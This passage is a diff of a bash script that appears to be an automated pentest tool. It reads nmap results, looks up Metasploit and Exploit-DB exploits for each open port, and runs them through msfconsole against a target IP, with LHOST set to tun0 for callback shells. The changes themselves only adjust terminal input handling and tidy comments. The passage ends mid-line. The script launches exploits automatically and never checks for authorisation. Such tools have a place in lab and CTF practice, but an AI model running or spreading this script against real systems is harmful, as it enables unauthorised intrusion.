@@ -2,11 +2,6 @@
 
 sudo apt update && sudo apt install -y $(cat dependencies.txt)
 
-# Fix for "stty: 'standard input': Inappropriate ioctl for device" error
-if [ ! -t 0 ]; then
-    exec < /dev/tty
-fi
-
 clear
 
 echo "
@@ -70,7 +65,7 @@ fi
 # Prompt user for input if loud/quiet scan option not provided as an argument
 if [[ -z "$lq" ]]
 then
-    read -p "Loud or quiet scan (l/q)? " lq
+    read -p "Loud or quiet scan (l/q)? " lq < /dev/tty
 fi
 
 # Validate user input
@@ -120,15 +115,12 @@ do
     echo -ne "Progress: [$count/$total_ports] ($progress%)\r"
 
     # Search in Metasploit Framework
-    # Search for exploits in Metasploit Framework
     echo "Searching in Metasploit Framework:"
     searchResults=$(msfconsole -q -x "search $port")
     if [ -n "$searchResults" ]
     then
         echo "$searchResults" | awk -v pattern="($port)" 'BEGIN { FS="|" } /exploits/ && ( $0 ~ pattern ) { printf "\033[41m%s\033[0m\n", $2; exploitsFound=true }'
     fi
-
-    
 
     # Search in other databases (e.g. Exploit-DB)
     echo "Searching in Exploit-DB:"
@@ -149,7 +141,6 @@ do
     ((current_port++))
 done <<< "$(grep -oP '(?<=Ports: ).*(?=\))' nmap-scan.txt | sed 's/ /\'$'\n/g' | sed 's/,//g')"
 
-
 if [ $exploitsFound = false ]
 then
     echo "No exploits found"
@@ -166,5 +157,4 @@ then
         exploitName=$(echo "$line" | cut -d ":" -f 2)
         echo "Executing $exploitName..."
         msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
-    done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
-fi
+    done <<< "$(grep -H -i -e 'CVE-\S\
